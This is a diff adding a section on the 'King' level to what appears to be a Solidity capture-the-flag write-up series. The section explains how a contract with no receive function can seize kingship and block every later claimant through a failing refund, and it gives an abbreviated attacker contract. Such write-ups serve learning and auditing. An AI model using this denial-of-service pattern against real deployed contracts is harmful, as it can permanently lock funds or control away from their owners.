@@ -509,3 +509,58 @@ success;
 ### References
 
 * https://docs.soliditylang.org/en/v0.8.18/internals/layout_in_storage.html
+
+## 09 King
+
+To beat this level, we need to comply with
+
+```solidity
+instance._king() != address(this)
+```
+
+i.e. Take away the factory's _kingship_ of the contract.
+
+### Solution
+
+First, let's take a look at this `receive()` function
+
+```solidity
+receive() external payable {
+  require(msg.value >= prize || msg.sender == owner);
+  payable(king).transfer(msg.value);
+  king = msg.sender;
+  prize = msg.value;
+}
+```
+
+The player can be `king` if they send more ETH than the current prize, *BUT*, the `owner` can be king anytime their want, and they exercise that right just before checking the level conditions:
+
+```solidity
+(bool result,) = address(instance).call{value:0}("");
+```
+
+Also, and this is important, if the claimant passes the control of the first line, they have to transfer what they sent to the incumbent `king`.
+
+So, to beat this level, just send a `msg.value` of ETH greater than the current price, and prevent any future claimant to fully execute the `receive()` function by not being able to receive the incumbent king's prize.
+
+```solidity
+contract KingAttacker {
+  // ... SNIP
+
+  function attack() external {
+    // will be able to be king, as msg.value = prize
+    // as the owner contract do have a receive() function,
+    // they will be able to get their price.
+    (bool result,) = challengeAddress.call{value: 0.001 ether}("");
+    result;
+  }
+
+  // this contract does not have a receive function,
+  // preventing the owner of the contract to take over kingship back.
+}
+```
+
+
+### References
+
+* https://docs.soliditylang.org/en/v0.8.18/contracts.html#receive-ether-function
